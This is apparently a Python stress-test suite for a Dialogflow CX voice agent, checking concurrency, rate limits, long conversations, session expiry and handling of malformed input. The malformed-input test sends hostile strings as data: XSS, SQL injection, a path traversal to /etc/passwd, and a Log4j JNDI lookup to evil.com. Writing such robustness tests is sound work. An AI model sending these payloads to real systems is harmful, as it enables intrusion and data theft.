#!/usr/bin/env python3
"""
Stress Testing & Failure Mode Analysis
Tests agent under adverse conditions to find breaking points
"""

import os
import sys
import time
import json
import concurrent.futures
from datetime import datetime
from google.cloud import dialogflowcx_v3 as dialogflow
from google.api_core.client_options import ClientOptions

PROJECT_ID = "tatt-pro"
LOCATION = "us-central1"
AGENT_NAME_FILE = "../config/agent-name.txt"
API_ENDPOINT = f"{LOCATION}-dialogflow.googleapis.com"

def load_agent_name():
    with open(AGENT_NAME_FILE, 'r') as f:
        return f.read().strip()

def get_client_options():
    return ClientOptions(api_endpoint=API_ENDPOINT)

def stress_test_concurrent_sessions(num_sessions=10):
    """
    Stress Test 1: Concurrent Sessions
    Create multiple sessions simultaneously to test scalability
    """
    print("\n" + "="*60)
    print(f"STRESS TEST 1: {num_sessions} Concurrent Sessions")
    print("="*60)
    
    agent_name = load_agent_name()
    client = dialogflow.SessionsClient(client_options=get_client_options())
    
    def make_query(session_id):
        try:
            session_path = f"{agent_name}/sessions/{session_id}"
            
            text_input = dialogflow.TextInput(text="Hello")
            query_input = dialogflow.QueryInput(
                text=text_input,
                language_code="en"
            )
            
            request = dialogflow.DetectIntentRequest(
                session=session_path,
                query_input=query_input
            )
            
            start_time = time.time()
            response = client.detect_intent(request=request)
            latency = (time.time() - start_time) * 1000  # ms
            
            return {
                'session_id': session_id,
                'success': True,
                'latency_ms': latency,
                'page': response.query_result.current_page.display_name
            }
            
        except Exception as e:
            return {
                'session_id': session_id,
                'success': False,
                'error': str(e)
            }
    
    # Execute concurrent sessions
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_sessions) as executor:
        session_ids = [f"stress-test-{i}" for i in range(num_sessions)]
        futures = [executor.submit(make_query, sid) for sid in session_ids]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    # Analyze results
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"\n✓ Completed: {len(successful)}/{num_sessions} sessions")
    print(f"✗ Failed: {len(failed)}/{num_sessions} sessions")
    
    if successful:
        latencies = [r['latency_ms'] for r in successful]
        avg_latency = sum(latencies) / len(latencies)
        min_latency = min(latencies)
        max_latency = max(latencies)
        
        print(f"\nLatency Stats:")
        print(f"  Average: {avg_latency:.1f}ms")
        print(f"  Min: {min_latency:.1f}ms")
        print(f"  Max: {max_latency:.1f}ms")
    
    if failed:
        print(f"\nFailure Reasons:")
        for r in failed[:5]:  # Show first 5
            print(f"  - Session {r['session_id']}: {r['error'][:100]}")
    
    return len(successful) == num_sessions

def stress_test_rapid_fire(num_queries=50):
    """
    Stress Test 2: Rapid-Fire Queries
    Send many queries in quick succession to test rate limiting
    """
    print("\n" + "="*60)
    print(f"STRESS TEST 2: {num_queries} Rapid-Fire Queries")
    print("="*60)
    
    agent_name = load_agent_name()
    client = dialogflow.SessionsClient(client_options=get_client_options())
    session_path = f"{agent_name}/sessions/rapid-fire-test"
    
    queries = ["Hello", "Yes", "No", "Help", "Goodbye"] * (num_queries // 5)
    
    results = []
    start_time = time.time()
    
    for i, text in enumerate(queries):
        try:
            text_input = dialogflow.TextInput(text=text)
            query_input = dialogflow.QueryInput(
                text=text_input,
                language_code="en"
            )
            
            request = dialogflow.DetectIntentRequest(
                session=session_path,
                query_input=query_input
            )
            
            query_start = time.time()
            response = client.detect_intent(request=request)
            query_latency = (time.time() - query_start) * 1000
            
            results.append({
                'query_num': i + 1,
                'success': True,
                'latency_ms': query_latency
            })
            
        except Exception as e:
            results.append({
                'query_num': i + 1,
                'success': False,
                'error': str(e)
            })
    
    total_time = time.time() - start_time
    
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"\n✓ Completed: {len(successful)}/{num_queries} queries")
    print(f"✗ Failed: {len(failed)}/{num_queries} queries")
    print(f"  Total time: {total_time:.1f}s")
    print(f"  Queries/sec: {num_queries / total_time:.1f}")
    
    if successful:
        latencies = [r['latency_ms'] for r in successful]
        print(f"\nLatency Stats:")
        print(f"  Average: {sum(latencies) / len(latencies):.1f}ms")
        print(f"  Max: {max(latencies):.1f}ms")
    
    return len(failed) == 0

def stress_test_long_conversation(num_turns=100):
    """
    Stress Test 3: Long Conversation
    Test context retention over many turns
    """
    print("\n" + "="*60)
    print(f"STRESS TEST 3: {num_turns}-Turn Conversation")
    print("="*60)
    
    agent_name = load_agent_name()
    client = dialogflow.SessionsClient(client_options=get_client_options())
    session_path = f"{agent_name}/sessions/long-conversation"
    
    # Conversation pattern
    conversation = [
        "Hello",
        "Can you hear me?",
        "Yes",
        "Great",
        "Thank you",
        "Goodbye"
    ]
    
    # Repeat pattern to reach num_turns
    turns = (conversation * (num_turns // len(conversation) + 1))[:num_turns]
    
    successful_turns = 0
    errors = []
    
    start_time = time.time()
    
    for i, text in enumerate(turns):
        try:
            text_input = dialogflow.TextInput(text=text)
            query_input = dialogflow.QueryInput(
                text=text_input,
                language_code="en"
            )
            
            request = dialogflow.DetectIntentRequest(
                session=session_path,
                query_input=query_input
            )
            
            response = client.detect_intent(request=request)
            successful_turns += 1
            
            if i % 10 == 0:
                print(f"  Turn {i + 1}/{num_turns}...", end='\r')
            
        except Exception as e:
            errors.append({
                'turn': i + 1,
                'text': text,
                'error': str(e)
            })
    
    total_time = time.time() - start_time
    
    print(f"\n✓ Completed: {successful_turns}/{num_turns} turns")
    print(f"  Total time: {total_time:.1f}s")
    print(f"  Avg per turn: {(total_time / num_turns) * 1000:.1f}ms")
    
    if errors:
        print(f"\n✗ Errors: {len(errors)}")
        for err in errors[:3]:
            print(f"  Turn {err['turn']}: {err['error'][:80]}")
    
    return len(errors) == 0

def stress_test_malformed_input():
    """
    Stress Test 4: Malformed Input
    Test with various types of bad/malformed input
    """
    print("\n" + "="*60)
    print("STRESS TEST 4: Malformed Input Handling")
    print("="*60)
    
    agent_name = load_agent_name()
    client = dialogflow.SessionsClient(client_options=get_client_options())
    
    test_cases = [
        ("", "Empty string"),
        (" ", "Whitespace only"),
        ("a" * 5000, "Very long input (5000 chars)"),
        ("\n\n\n", "Newlines only"),
        ("😀😁😂🤣", "Emoji only"),
        ("NULL", "SQL injection attempt"),
        ("<script>alert('xss')</script>", "XSS attempt"),
        ("' OR '1'='1", "SQL injection"),
        ("../../../etc/passwd", "Path traversal"),
        ("${jndi:ldap://evil.com/a}", "Log4j exploit"),
    ]
    
    results = []
    
    for text, description in test_cases:
        try:
            session_path = f"{agent_name}/sessions/malformed-{hash(text)}"
            
            text_input = dialogflow.TextInput(text=text)
            query_input = dialogflow.QueryInput(
                text=text_input,
                language_code="en"
            )
            
            request = dialogflow.DetectIntentRequest(
                session=session_path,
                query_input=query_input
            )
            
            response = client.detect_intent(request=request)
            
            results.append({
                'description': description,
                'success': True,
                'handled': True
            })
            print(f"  ✓ {description}: Handled gracefully")
            
        except Exception as e:
            error_type = type(e).__name__
            results.append({
                'description': description,
                'success': False,
                'error': error_type,
                'message': str(e)[:100]
            })
            print(f"  ✗ {description}: {error_type}")
    
    handled = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"\n✓ Handled: {len(handled)}/{len(test_cases)}")
    print(f"✗ Failed: {len(failed)}/{len(test_cases)}")
    
    return len(failed) <= 2  # Allow up to 2 failures for edge cases

def stress_test_session_expiry():
    """
    Stress Test 5: Session Expiry & Cleanup
    Test what happens with old/expired sessions
    """
    print("\n" + "="*60)
    print("STRESS TEST 5: Session Expiry Handling")
    print("="*60)
    
    agent_name = load_agent_name()
    client = dialogflow.SessionsClient(client_options=get_client_options())
    
    # Create a session and let it sit
    session_path = f"{agent_name}/sessions/expiry-test-{int(time.time())}"
    
    try:
        # First query
        text_input = dialogflow.TextInput(text="Hello")
        query_input = dialogflow.QueryInput(
            text=text_input,
            language_code="en"
        )
        
        request = dialogflow.DetectIntentRequest(
            session=session_path,
            query_input=query_input
        )
        
        response1 = client.detect_intent(request=request)
        print("✓ Initial query successful")
        
        # Simulate delay (short version - real session timeout is 30 min)
        print("  Simulating delay (5 seconds)...")
        time.sleep(5)
        
        # Second query on same session
        response2 = client.detect_intent(request=request)
        print("✓ Query after delay successful")
        
        # Session should still work
        return True
        
    except Exception as e:
        print(f"✗ Session expiry test failed: {e}")
        return False

def run_all_stress_tests():
    """Run all stress tests and report results"""
    print("\n" + "="*70)
    print(" AI VOICE CALLER - COMPREHENSIVE STRESS TEST SUITE")
    print("="*70)
    print(f" Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)
    
    results = {}
    
    # Run all stress tests
    results['concurrent_sessions'] = stress_test_concurrent_sessions(num_sessions=10)
    results['rapid_fire'] = stress_test_rapid_fire(num_queries=50)
    results['long_conversation'] = stress_test_long_conversation(num_turns=100)
    results['malformed_input'] = stress_test_malformed_input()
    results['session_expiry'] = stress_test_session_expiry()
    
    # Final summary
    print("\n" + "="*70)
    print(" STRESS TEST SUMMARY")
    print("="*70)
    
    passed = sum(1 for v in results.values() if v)
    total = len(results)
    
    for test, result in results.items():
        status = "✓ PASS" if result else "✗ FAIL"
        print(f" {status}: {test.replace('_', ' ').title()}")
    
    print("="*70)
    print(f" Results: {passed}/{total} tests passed ({int(passed/total*100)}%)")
    print(f" Finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)
    
    if passed == total:
        print("\n 🎉 ALL STRESS TESTS PASSED - System is robust!")
    elif passed >= total * 0.8:
        print("\n ✓ Most stress tests passed - minor edge cases to handle")
    else:
        print("\n ⚠ Significant failures under stress - review results")
    
    return results

if __name__ == "__main__":
    results = run_all_stress_tests()
    exit(0 if all(results.values()) else 1)
